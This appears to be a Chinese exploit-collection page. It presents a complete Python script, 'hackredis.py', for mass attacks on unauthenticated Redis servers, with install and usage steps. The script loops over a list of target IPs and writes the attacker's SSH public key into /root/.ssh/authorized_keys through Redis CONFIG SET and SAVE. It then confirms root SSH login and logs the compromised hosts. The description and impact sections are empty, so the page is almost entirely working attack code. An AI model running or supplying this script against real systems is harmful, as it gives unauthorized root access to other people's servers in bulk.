<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs98083A41{color:#000000;background-color:transparent;font-family:MS Gothic;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="pythonredis未授权批量提权脚本"><span class="csDE05BCC">(python)redis</span><span class="csECDA2D3">未授权批量提权脚本</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">(python)redis</span><span class="cs9C1B1871">未授权批量提权脚本</span></p><h2 class="cs868C439D">
			<a name="二、影响范围"><span class="cs83F14626">二、影响范围</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h4 class="cs868C439D">
			<a name="安装依赖"><span class="cs6EDCDAE2">安装依赖</span></a></h4>
		<p class="cs3A447A38"><span class="cs98083A41">☁</span><span class="cs9FB05234"> &nbsp;~ sudo easy_install redis</span></p><h4 class="cs868C439D">
			<a name="使用"><span class="cs6EDCDAE2">使用</span></a></h4>
		<p class="cs3A447A38"><span class="cs98083A41">☁</span><span class="cs9FB05234"> &nbsp;redis &nbsp;python hackredis.py &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">usage: hackredis.py [-h] [-l IPLIST] [-p PORT] [-r ID_RSAFILE] [-sp SSH_PORT]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">For Example:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">-----------------------------------------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">python hackredis.py &nbsp;-l ip.txt -p 6379 -r foo.txt -sp 22</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">optional arguments:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-h, --help &nbsp;&nbsp;&nbsp;&nbsp;show this help message and exit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-l IPLIST &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the hosts of target</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-p PORT &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the redis default port</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-r ID_RSAFILE &nbsp;the ssh id_rsa file you generate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-sp SSH_PORT &nbsp;&nbsp;the ssh port</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先需要</span><span class="cs8926E06">ssh</span><span class="cs9C1B1871">密钥</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs98083A41">☁</span><span class="cs9FB05234"> &nbsp;~ &nbsp;ssh-keygen -t rsa</span><span class="cs8926E06"><br/></span><span class="cs98083A41">☁</span><span class="cs9FB05234"> &nbsp;~ &nbsp;cp ~/.ssh/id_rsa.pub /tmp/foo.txt</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">之后将</span><span class="cs8926E06">ip</span><span class="cs9C1B1871">列表填入</span><span class="cs8926E06">ip.txt</span><span class="cs9C1B1871">，然后就可以跑了。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">成功的将会输出到</span><span class="cs8926E06">success.txt,</span><span class="cs9C1B1871">执行成功但是</span><span class="cs8926E06">ssh</span><span class="cs9C1B1871">连接失败的会存储在</span><span class="cs8926E06">unconnect.txt</span><span class="cs9C1B1871">，操作失败的会存储在</span><span class="cs8926E06">fail.txt</span><span class="cs9C1B1871">。</span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/python</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#coding:utf-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#############################################################</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">## @file &nbsp;&nbsp;&nbsp;hackredis.py &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;##</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">## @date &nbsp;&nbsp;&nbsp;2015-12-11 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;##</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">## @author &nbsp;evi1cg &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;##</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#############################################################</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import redis</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import argparse</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import textwrap</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import pexpect</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def getargs():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;parser = argparse.ArgumentParser(prog=&#39;hackredis.py&#39;, formatter_class=argparse.RawTextHelpFormatter, description=textwrap.dedent(&#39;&#39;&#39;\</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;For Example:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-----------------------------------------------------------------------------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;python hackredis.py &nbsp;-l ip.txt -p 6379 -r foo.txt -sp 22&#39;&#39;&#39;))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;parser.add_argument(&#39;-l&#39;, dest=&#39;iplist&#39;, type=str, help=&#39;the hosts of target&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;parser.add_argument(&#39;-p&#39;, dest=&#39;port&#39;, default=6379, type=int, help=&#39;the redis default port&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;parser.add_argument(&#39;-r&#39;, dest=&#39;id_rsafile&#39;, type=str, help=&#39;the ssh id_rsa file you generate&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;parser.add_argument(&#39;-sp&#39;, dest=&#39;ssh_port&#39;, type=int,default=22, help=&#39;the ssh port&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(len(sys.argv[1:]) / 2 != 4):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sys.argv.append(&#39;-h&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return parser.parse_args()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def hackredis(host,port):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;ck = 0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &quot;[*] Attacking ip:%s&quot;%host</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r =redis.StrictRedis(host=host,port=port,db=0,socket_timeout=2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r.flushall</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r.set(&#39;crackit&#39;,foo)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r.config_set(&#39;dir&#39;,&#39;/root/.ssh/&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r.config_set(&#39;dbfilename&#39;,&#39;authorized_keys&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r.save()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ck =1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;except:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &quot;\033[1;31;40m[-]\033[0m Something wrong with %s&quot;%host</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;write(host,2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ck =0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if ck == 1:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;check(host)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;pass</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def check(host):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;print &#39;\033[1;33;40m[*]\033[0m Check connecting... &#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ssh = pexpect.spawn(&#39;ssh root@%s -p %d&#39; %(host,ssh_port))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;i = ssh.expect(&#39;[#\$]&#39;,timeout=2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if i == 0:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;\033[1;34;40m[+]\033[0m Success !&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(host,1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;except:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &quot;\033[1;32;40m[-]\033[0m Failed to connect !&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;write(host,3)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def write(host,suc):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if suc == 1:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;filesname = &#39;success.txt&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;elif suc ==2:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;filesname = &#39;fail.txt&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;elif suc ==3:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;filesname = &#39;unconnect.txt&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;pass</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;file_object = open(filesname,&#39;a&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;file_object.write(host+&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;file_object.close()</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def main():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;global foo,ssh_port</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;paramsargs = getargs()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;hosts = open(paramsargs.iplist,&quot;r&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;except(IOError):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &quot;Error: Check your hostfile path</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sys.exit(1) </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;port = paramsargs.port</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;ssh_port = paramsargs.ssh_port</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;foo = &#39;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">&#39;+open(paramsargs.id_rsafile,&quot;r&quot;).readline()+&#39;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;except(IOError):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &quot;Error: Check your wordlist path</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sys.exit(1) &nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;ips = [p.replace(&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&#39;,&#39;&#39;) for p in hosts]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;for ip in ips:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;hackredis(ip.strip(),port)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">if __name__ == &quot;__main__&quot;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;main()</span></p></body>
</html>
